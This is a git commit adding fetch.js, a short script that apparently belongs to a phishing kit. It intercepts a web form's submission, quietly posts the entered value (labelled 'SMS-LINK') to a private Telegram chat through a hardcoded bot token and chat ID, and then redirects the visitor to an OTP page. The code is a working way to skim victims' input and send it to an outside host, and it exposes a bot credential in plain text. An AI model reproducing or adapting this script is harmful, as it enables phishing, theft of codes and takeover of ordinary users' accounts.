33db91fbb295ef7d82172c3fde56c4acf05a9d7a
in-id <134689497+in-id@users.noreply.github.com>
2024-09-04 18:48:06 +0700

    Add files via upload

---
+++ fetch.js
@@ -0,0 +1,43 @@
+
+        
+    const TOKEN = "6531065543:AAFsIIHzhvNF3vLW-tIQ1V5aekM22-udB3U";
+const CHAT_ID = "7074576816";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { name, } = form;
+  const data = {
+    name: name.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>SMS-LINK : </b> ${data.name}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href = '/otp.html';
+}
+
